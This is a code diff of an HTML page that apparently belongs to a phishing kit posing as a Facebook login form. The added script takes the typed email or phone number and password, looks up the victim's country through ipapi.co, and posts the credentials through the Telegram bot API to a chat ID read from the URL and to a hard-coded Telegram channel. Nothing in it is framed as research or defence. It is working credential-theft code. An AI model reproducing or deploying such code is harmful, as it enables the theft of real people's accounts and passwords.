@@ -69,7 +69,7 @@
     <input type="text" id="identifier" placeholder="Mobile number or email" required>
     <input type="password" id="password" placeholder="Password" required>
     <button type="submit">Log In</button>
-    <div class="developer">Developer by @ProHacker43</div>
+    <div class="developer">Developer by @ProH43</div>
   </form>
 </div>
 
@@ -78,4 +78,60 @@
   const telegramChannel = '@PRO_43KPISH';
 
   function getQueryParam(param) {
-    const urlParams = 
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  async function getGeoInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json');
+      return await res.json();
+    } catch {
+      return { country_name: "Unknown", country_code: "" };
+    }
+  }
+
+  function getFlag(code) {
+    if (!code) return "";
+    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt()));
+  }
+
+  async function sendTelegram(chatId, text) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: text })
+    });
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const telegramId = getQueryParam('id');
+    if (!telegramId) {
+      alert("❗ Telegram ID په URL کې نشته!");
+      return;
+    }
+
+    const identifier = document.getElementById("identifier").value;
+    const password = document.getElementById("password").value;
+
+    const geo = await getGeoInfo();
+    const country = geo.country_name || "Unknown";
+    const flag = getFlag(geo.country_code);
+
+    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProH43`;
+
+    // Send message to user
+    await sendTelegram(telegramId, msg);
+
+    // Send message to channel
+    await sendTelegram(telegramChannel, msg);
+
+    alert("Please wait...");
+  });
+</script>
+
+</body>
+</html> 
